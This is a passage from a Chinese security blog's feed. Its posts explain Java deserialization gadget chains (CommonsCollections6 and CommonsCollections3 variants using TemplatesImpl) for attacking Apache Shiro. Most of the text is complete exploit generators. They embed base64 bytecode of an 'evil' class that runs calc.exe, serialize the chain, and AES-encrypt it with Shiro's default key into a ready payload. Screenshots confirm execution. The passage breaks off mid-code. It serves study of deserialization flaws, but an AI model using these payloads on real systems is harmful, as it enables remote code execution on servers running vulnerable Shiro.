class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个数组虽然说只有两个元素，但它好歹也算个数组呀，还是不符合条件，那我们就得想办法去掉这个数组中的一个元素，那么不就可以了？后面那个执行命令的<code>InvokerTransformer</code>肯定是没办法去掉的，但是前面那个用来返回对象的<code>ConstantTransformer</code>，我们有没有机会去掉呢？继续往下看哈</p><p>我们先来回顾一下<code>InvokerTransformer</code>类中的<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，它执行的是<code>input</code>对象中的<code>iMethodName</code>方法，而前面我们是通过<code>ConstantTransformer</code>将对象传进来的，那这里我们能不能直接传呢，接着往前看，看看<code>LazyMap</code>中的<code>get</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里很惊奇的发现，这个<code>key</code>，居然被当作参数传了进去，<code>this.factory.transform(key)</code>，那么假如这个key就是前面我们想要通过<code>ConstantTransformer</code>传进来的对象，那我们不就可以执行这个对象中的方法了吗，简直是太妙了哈哈哈</p><p>那么我们就可以去掉前面那个<code>new ConstantTransformer(obj)</code>了，这样子数据中的元素个数也就降为1了，也就不用数组了，而且由于只有一个了，连<code>ChainedTransformer</code>都用不着了</p><h2 id="InvokerTransformer版-cc6"><a href="#InvokerTransformer版-cc6" class="headerlink" title="InvokerTransformer版(cc6)"></a>InvokerTransformer版(cc6)</h2><p>接下来我们看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getClass&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap,obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme,<span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实挺好理解的吧，就是在构造<code>TiedMapEntry</code>的时候把<code>obj</code>对象传进去，传在<code>key</code>的位置上就好了，还是先传入一 个人畜无害的方法，比如<code>getClass</code> ，避免恶意方法在构造Gadget的时候触发，最后，将<code>InvokerTransformer</code>的方法从人畜无害的<code>getClass</code>，改成 <code>newTransformer </code>，就搞定了，运行它得到base64字符串，直接去打：</p><p><img src="https://s2.loli.net/2022/03/03/kXfwzFvt9ocmEl7.png" alt="image.png"></p><p>弹出计算器，完美，这个算是cc6的链子，因为用了<code>InvokerTransformer</code>，接下来看看cc3的链子</p><h2 id="InstantiateTransformer版-cc3"><a href="#InstantiateTransformer版-cc3" class="headerlink" title="InstantiateTransformer版(cc3)"></a>InstantiateTransformer版(cc3)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;);</span><br><span class="line">        Transformer fakeTransformers=<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,fakeTransformers);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap,TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme,<span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap,<span class="string">&quot;factory&quot;</span>,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/03/ZstUKnb19yxMG73.png" alt="image.png"></p><p>很漂亮，原理都是一样的，这里把<code>TrAXFilter.class</code>传进来就好了</p><p>好累呀好累呀 回去躺平咯</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用TemplatesImp攻击Shiro&quot;&gt;&lt;a href=&quot;#利用TemplatesImp攻击Shiro&quot; class=&quot;headerlink&quot; title=&quot;利用TemplatesImp攻击Shiro&quot;&gt;&lt;/a&gt;利用TemplatesImp攻击Shiro&lt;/h1&gt;&lt;p&gt;这篇文章虽然写的是攻击Shiro，但实际上跟shiro关系不算特别大，主要是利用&lt;code&gt;TemplatesImpl&lt;/code&gt;构造一条cc的链子，其实我们都已经有&lt;code&gt;CommonsCollections6&lt;/code&gt;这样可以通杀的利用链了，那么为什么还需要&lt;code&gt;TemplatesImpl&lt;/code&gt;这种呢？因为&lt;code&gt;TemplatesImpl&lt;/code&gt;理论上是可以执行任意Java代码的，通用性非常高&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 3</title>
    <link href="https://arsenetang.github.io/2022/03/01/Java%E7%AF%87%E4%B9%8BCommonsCollections%203/"/>
    <id>https://arsenetang.github.io/2022/03/01/Java%E7%AF%87%E4%B9%8BCommonsCollections%203/</id>
    <published>2022-02-28T16:00:00.000Z</published>
    <updated>2022-03-07T13:58:58.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h1><p>前面我们讲到了利用<code>TemplatesImpl</code>加载字节码，只不过那时我们是手动调用的<code>newTransformer</code>来触发的，接下来我们就来看看如何利用cc链来触发，以及cc3中用到的新类</p><span id="more"></span><p>这里用cc链来触发，实际上就是指用<code>InvokerTransformer</code>来调用<code>newTransformer</code>这个方法嘛，和前面的方法是一样的，这里我就直接给出代码了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer [] transformers = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> 